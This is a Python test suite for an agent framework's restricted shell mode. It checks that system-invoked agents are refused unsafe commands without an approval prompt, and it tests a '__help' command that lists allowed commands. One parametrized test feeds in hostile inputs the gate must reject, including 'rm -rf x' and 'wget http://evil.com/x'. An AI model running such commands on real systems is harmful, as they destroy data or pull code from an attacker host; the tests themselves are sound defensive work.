#!/usr/bin/env python3
"""Tests for shell_cmd `__help` + restricted mode for system-invoked agents.

Covers:
- The `_is_restricted()` / `_agent_is_restricted()` flag-resolution helpers (True/False,
  mock-pool safety).
- The SYNC hard-reject gate in ``ShellMixin.execute_shell_command`` (safe cmd passes, unsafe
  cmd rejected with the exact message, approval never called).
- The ASYNC hard-reject gate in ``ShellCmd._launch_async`` (same pattern).
- The `__help` pseudo-command: section headers, correct counts, restricted vs normal banner,
  works with no justification.
- Control commands bypassing the restricted gate.

No LLM or network connections required.
"""

from contextlib import contextmanager
from unittest.mock import MagicMock, patch

import pytest

from agent_cascade.operation_manager.shell import ShellMixin


# ────────────────────────────────────────────────────────────────────────
# Exact rejection message (must match both gates verbatim)
# ────────────────────────────────────────────────────────────────────────
REJECTED_MSG = ('REJECTED: Command not allowed for system agents. '
                'Only read-only filesystem/git commands are permitted. '
                'Use __help to see allowed commands.')


@contextmanager
def _patch_popen():
    """Patch ``subprocess.Popen`` with a no-op fake so the sync path never spawns a real
    process. Yields the patcher; used only to prove which branch a command takes."""
    class _FakeProc:
        returncode = 0

        def wait(self, timeout=None):
            pass

    def _fake_popen(*a, **k):
        p = _FakeProc()
        p.stdout = iter([])
        p.stderr = iter([])
        return p

    with patch('subprocess.Popen', side_effect=_fake_popen):
        yield


def _make_instance(restricted):
    """Build a lightweight object standing in for an AgentInstance (only the flag matters)."""
    inst = MagicMock()
    inst.restricted_shell = restricted
    return inst


class _FakePool:
    """Minimal pool exposing only ``.instances`` — avoids MagicMock auto-attr pitfalls."""

    def __init__(self, instances=None):
        self.instances = dict(instances or {})


# ============================================================================
# Fixtures
# ============================================================================


@pytest.fixture
def shell_cmd_tool():
    from agent_cascade.tools.custom.shell_cmd import ShellCmd
    return ShellCmd()


# ============================================================================
# 4.1 Flag-resolution helpers
# ============================================================================


class TestIsRestrictedHelper:
    """Both the tool-layer (ShellCmd) and mixin-layer (ShellMixin) helpers."""

    def test_shellcmd_restricted_true(self, shell_cmd_tool):
        pool = _FakePool({'sec': _make_instance(True)})
        shell_cmd_tool.agent_pool = pool
        assert shell_cmd_tool._is_restricted('sec') is True

    def test_shellcmd_not_restricted_false(self, shell_cmd_tool):
        pool = _FakePool({'normal': _make_instance(False)})
        shell_cmd_tool.agent_pool = pool
        assert shell_cmd_tool._is_restricted('normal') is False

    def test_shellcmd_unknown_name(self, shell_cmd_tool):
        pool = _FakePool({'sec': _make_instance(True)})
        shell_cmd_tool.agent_pool = pool
        assert shell_cmd_tool._is_restricted('does_not_exist') is False

    def test_shellcmd_no_agent_pool_attr(self):
        from agent_cascade.tools.custom.shell_cmd import ShellCmd
        tool = object.__new__(ShellCmd)  # no __init__ → no agent_pool attribute
        assert tool._is_restricted('anything') is False

    def test_shellcmd_none_pool(self, shell_cmd_tool):
        shell_cmd_tool.agent_pool = None
        assert shell_cmd_tool._is_restricted('sec') is False

    def test_shellcmd_instance_without_flag_attr(self, shell_cmd_tool):
        # An instance built before this change has no restricted_shell attribute.
        pool = _FakePool({'old': MagicMock(spec=[])})  # spec=[] → no attributes at all
        shell_cmd_tool.agent_pool = pool
        assert shell_cmd_tool._is_restricted('old') is False

    def test_bare_magicmock_pool_is_not_restricted(self, shell_cmd_tool):
        """Regression: a bare MagicMock pool (as used by many existing tests) must NOT be
        mis-flagged as restricted. Its ``instances`` is an auto-attribute mock, not a real
        dict, so the helper must degrade to False — otherwise every unsafe command on such a
        pool would be wrongly rejected before launch/approval."""
        shell_cmd_tool.agent_pool = MagicMock()
        assert shell_cmd_tool._is_restricted('test_agent') is False

    def test_mixin_bare_magicmock_pool_is_not_restricted(self):
        om = MagicMock()  # agent_pool and instances are both auto-attribute mocks
        assert ShellMixin._agent_is_restricted(om, 'test_agent') is False

    def test_mixin_restricted_true(self):
        om = MagicMock()
        om.agent_pool = _FakePool({'sec': _make_instance(True)})
        assert ShellMixin._agent_is_restricted(om, 'sec') is True

    def test_mixin_not_restricted_false(self):
        om = MagicMock()
        om.agent_pool = _FakePool({'normal': _make_instance(False)})
        assert ShellMixin._agent_is_restricted(om, 'normal') is False

    def test_mixin_none_pool(self):
        om = MagicMock()
        om.agent_pool = None
        assert ShellMixin._agent_is_restricted(om, 'sec') is False

    def test_mixin_instances_not_a_dict(self):
        """Pool whose .instances exists but is not a dict → False (defensive)."""
        om = MagicMock()
        om.agent_pool = MagicMock()
        om.agent_pool.instances = 'not a dict'
        assert ShellMixin._agent_is_restricted(om, 'sec') is False

    def test_shellcmd_instances_not_a_dict(self, shell_cmd_tool):
        """Same guard at the tool layer."""
        pool = MagicMock()
        pool.instances = [1, 2, 3]  # list, not dict
        shell_cmd_tool.agent_pool = pool
        assert shell_cmd_tool._is_restricted('sec') is False


# ============================================================================
# 4.2 SYNC gate (shell.py execute_shell_command)
# ============================================================================


class TestSyncRestrictedGate:

    def _make_om(self, instances):
        from agent_cascade.operation_manager import OperationManager
        om = OperationManager.__new__(OperationManager)
        om.agent_pool = _FakePool(instances)
        om.base_dir = '/tmp'  # unused on the reject path; keeps truncation happy if reached
        return om

    def test_restricted_unsafe_returns_exact_rejection(self):
        om = self._make_om({'sec': _make_instance(True)})
        result = om.execute_shell_command(
            command='python script.py', justification='run it', agent_name='sec')
        assert result == REJECTED_MSG

    @pytest.mark.parametrize('cmd', [
        'rm -rf x',
        "python -c 'import os; os.system(\"echo hi\")'",
        'git stash drop',
        'wget http://evil.com/x',
    ])
    def test_restricted_unsafe_variants(self, cmd):
        om = self._make_om({'sec': _make_instance(True)})
        result = om.execute_shell_command(command=cmd, justification='x', agent_name='sec')
        assert result == REJECTED_MSG

    def test_restricted_approval_never_called(self):
        """The whole point: the blocking request_user_approval must never run."""
        om = self._make_om({'sec': _make_instance(True)})

        def _boom(*a, **k):
            raise AssertionError('request_user_approval must NOT be called for restricted agents')

        om.request_user_approval = _boom
        result = om.execute_shell_command(command='rm -rf x', justification='x', agent_name='sec')
        assert result == REJECTED_MSG

    def test_restricted_safe_command_not_rejected(self):
        """A safe command must NOT hit the reject branch (proves the gate is conditional)."""
        om = self._make_om({'sec': _make_instance(True)})
        # 'git status' is safe → auto-approved path → proceeds to spawn. We patch Popen so no
        # real process runs; the key assertion is that the result is NOT the REJECTED string.
        with _patch_popen():
            result = om.execute_shell_command(command='git status', justification='x', agent_name='sec')
        assert result != REJECTED_MSG
        assert not result.startswith('REJECTED')

    def test_non_restricted_unsafe_proceeds_to_approval(self):
        """Regression: a normal (non-restricted) agent still goes through the approval path."""
        om = self._make_om({'normal': _make_instance(False)})
        om.request_user_approval = MagicMock(return_value=(True, 'ok'))
        with _patch_popen():
            result = om.execute_shell_command(command='python script.py', justification='x', agent_name='normal')
        # Approval WAS consulted (this is unchanged normal behavior).
        om.request_user_approval.assert_called_once()
        assert not result.startswith('REJECTED: Command not allowed for system agents.')


# ============================================================================
# 4.3 ASYNC gate (shell_cmd.py _launch_async)
# ============================================================================


class TestAsyncRestrictedGate:

    def _wire(self, shell_cmd_tool, instances, tracker):
        pool = _FakePool(instances)
        pool._async_shell_tracker = tracker
        pool.llm_cfg = {}  # dict so .get('shell_char_limit', default) returns default
        om = MagicMock()
        om.request_user_approval.side_effect = AssertionError(
            'request_user_approval must NOT be called for restricted agents')
        pool.operation_manager = om
        shell_cmd_tool.agent_pool = pool
        shell_cmd_tool.agent_name = 'sec'
        return pool

    def test_restricted_unsafe_returns_exact_rejection(self, shell_cmd_tool):
        tracker = MagicMock()
        self._wire(shell_cmd_tool, {'sec': _make_instance(True)}, tracker)
        result = shell_cmd_tool._launch_async(
            agent_name='sec', command='python script.py', justification='x',
            cwd=None, timeout=None, heartbeat_interval=-1)
        assert result == REJECTED_MSG
        tracker.launch.assert_not_called()

    def test_restricted_unsafe_never_launches_or_approves(self, shell_cmd_tool):
        tracker = MagicMock()
        pool = self._wire(shell_cmd_tool, {'sec': _make_instance(True)}, tracker)
        result = shell_cmd_tool._launch_async(
            agent_name='sec', command='rm -rf x', justification='x',
            cwd=None, timeout=None, heartbeat_interval=-1)
        assert result == REJECTED_MSG
        tracker.launch.assert_not_called()
        pool.operation_manager.request_user_approval.assert_not_called()

    def test_restricted_safe_launches_normally(self, shell_cmd_tool):
        """A safe async command is auto-approved and launches (no rejection)."""
        tracker = MagicMock()
        # completed_early=True → returns a completion string without needing console/env.
        tracker.launch.return_value = (1, 12345, ['ok'], True, 0)
        self._wire(shell_cmd_tool, {'sec': _make_instance(True)}, tracker)
        result = shell_cmd_tool._launch_async(
            agent_name='sec', command='git log --oneline', justification='x',
            cwd=None, timeout=None, heartbeat_interval=-1)
        assert result != REJECTED_MSG
        assert not result.startswith('REJECTED')
        tracker.launch.assert_called_once()

    def test_control_command_bypasses_gate(self, shell_cmd_tool):
        """__status with a tool_id routes to control handling, never the restricted gate."""
        pool = _FakePool({'sec': _make_instance(True)})
        tracker = MagicMock()
        tracker.get_task.return_value = None  # no running task → "No running shell found"
        pool._async_shell_tracker = tracker
        pool.llm_cfg = {}
        shell_cmd_tool.agent_pool = pool
        shell_cmd_tool.agent_name = 'sec'

        result = shell_cmd_tool.call('{"command": "__status", "tool_id": 1}')
        assert result != REJECTED_MSG
        # Control routing was used (not the restricted reject).
        assert 'REJECTED: Command not allowed for system agents.' not in result


# ============================================================================
# 4.4 `__help` pseudo-command
# ============================================================================


class TestHelpCommand:

    def test_help_normal_mode(self, shell_cmd_tool):
        pool = _FakePool({'normal': _make_instance(False)})
        shell_cmd_tool.agent_pool = pool
        shell_cmd_tool.agent_name = 'normal'
        result = shell_cmd_tool.call('{"command": "__help"}')  # no justification

        assert '[NORMAL MODE]' in result
        assert '[RESTRICTED MODE]' not in result
        # Section headers (counts are derived from the live allow-list sets so they can't drift)
        for header in [
            'shell_cmd auto-approval reference',
            f'Primary read-only commands ({len(ShellMixin._SAFE_PRIMARY_COMMANDS)}):',
            f'Git subcommands ({len(ShellMixin._SAFE_GIT_SUBCOMMANDS)})',
            'Allowed git flags before the subcommand:',
            'Dangerous git args that are BLOCKED (per subcommand):',
            f"Safe pipe/filter stages (anything after a '|') ({len(ShellMixin._SAFE_PIPE_COMMANDS)}):",
            'Allowed patterns:',
            f'Async shell control commands ({len(ShellMixin._CONTROL_COMMANDS)}):',
            'NOT allowed:',
        ]:
            assert header in result, f"missing section header: {header!r}"

    def test_help_restricted_mode(self, shell_cmd_tool):
        pool = _FakePool({'sec': _make_instance(True)})
        shell_cmd_tool.agent_pool = pool
        shell_cmd_tool.agent_name = 'sec'
        result = shell_cmd_tool.call('{"command": "__help"}')

        assert '[RESTRICTED MODE]' in result
        assert '[NORMAL MODE]' not in result

    def test_help_counts_match_sets(self, shell_cmd_tool):
        """Counts rendered by __help must match the actual allow-list sizes (no drift)."""
        pool = _FakePool({'normal': _make_instance(False)})
        shell_cmd_tool.agent_pool = pool
        shell_cmd_tool.agent_name = 'normal'
        result = shell_cmd_tool.call('{"command": "__help"}')

        assert f"Primary read-only commands ({len(ShellMixin._SAFE_PRIMARY_COMMANDS)}):" in result
        assert f"Git subcommands ({len(ShellMixin._SAFE_GIT_SUBCOMMANDS)})" in result
        assert f"Safe pipe/filter stages (anything after a '|') ({len(ShellMixin._SAFE_PIPE_COMMANDS)}):" in result
        assert f"Async shell control commands ({len(ShellMixin._CONTROL_COMMANDS)}):" in result

    def test_help_lists_every_entry(self, shell_cmd_tool):
        """Every allow-list entry must appear in the output."""
        pool = _FakePool({'normal': _make_instance(False)})
        shell_cmd_tool.agent_pool = pool
        shell_cmd_tool.agent_name = 'normal'
        result = shell_cmd_tool.call('{"command": "__help"}')

        for cmd in ShellMixin._SAFE_PRIMARY_COMMANDS:
            assert cmd in result, f"primary command missing from help: {cmd!r}"
        for sub in ShellMixin._SAFE_GIT_SUBCOMMANDS:
            assert sub in result, f"git subcommand missing from help: {sub!r}"
        for filt in ShellMixin._SAFE_PIPE_COMMANDS:
            assert filt in result, f"pipe command missing from help: {filt!r}"
        for ctrl in ShellMixin._CONTROL_COMMANDS:
            assert ctrl in result, f"control command missing from help: {ctrl!r}"

    def test_help_sentinel_substrings(self, shell_cmd_tool):
        """Stable sentinel lines (guards against accidental reformatting)."""
        pool = _FakePool({'normal': _make_instance(False)})
        shell_cmd_tool.agent_pool = pool
        shell_cmd_tool.agent_name = 'normal'
        result = shell_cmd_tool.call('{"command": "__help"}')

        assert 'git stash: apply clear drop pop' in result
        assert '__heartbeat=N' in result

    def test_help_works_with_no_justification(self, shell_cmd_tool):
        """__help must not raise the justification-required error."""
        pool = _FakePool({'normal': _make_instance(False)})
        shell_cmd_tool.agent_pool = pool
        shell_cmd_tool.agent_name = 'normal'
        # Would raise ValueError('...justification is required...') if the branch were misplaced.
        result = shell_cmd_tool.call('{"command": "__help"}')
        assert isinstance(result, str) and result

    def test_help_takes_precedence_over_control_routing(self, shell_cmd_tool):
        """Even with a tool_id present, __help is returned (not control-handled)."""
        pool = _FakePool({'sec': _make_instance(True)})
        tracker = MagicMock()
        pool._async_shell_tracker = tracker
        pool.llm_cfg = {}
        shell_cmd_tool.agent_pool = pool
        shell_cmd_tool.agent_name = 'sec'

        result = shell_cmd_tool.call('{"command": "__help", "tool_id": 5}')
        assert '[RESTRICTED MODE]' in result
        # The control handler must not have been entered.
        tracker.get_task.assert_not_called()

    def test_help_with_whitespace(self, shell_cmd_tool):
        pool = _FakePool({'normal': _make_instance(False)})
        shell_cmd_tool.agent_pool = pool
        shell_cmd_tool.agent_name = 'normal'
        result = shell_cmd_tool.call('{"command": "  __help  "}')
        assert '[NORMAL MODE]' in result

    def test_help_case_insensitive(self, shell_cmd_tool):
        """__HELP and __Help should work the same as __help."""
        pool = _FakePool({'normal': _make_instance(False)})
        shell_cmd_tool.agent_pool = pool
        shell_cmd_tool.agent_name = 'normal'
        for variant in ('__HELP', '__Help', '__hElP'):
            result = shell_cmd_tool.call('{"command": "%s"}' % variant)
            assert '[NORMAL MODE]' in result, f"case variant {variant!r} not recognized"


if __name__ == '__main__':
    import sys
    sys.exit(pytest.main([__file__, '-v']))
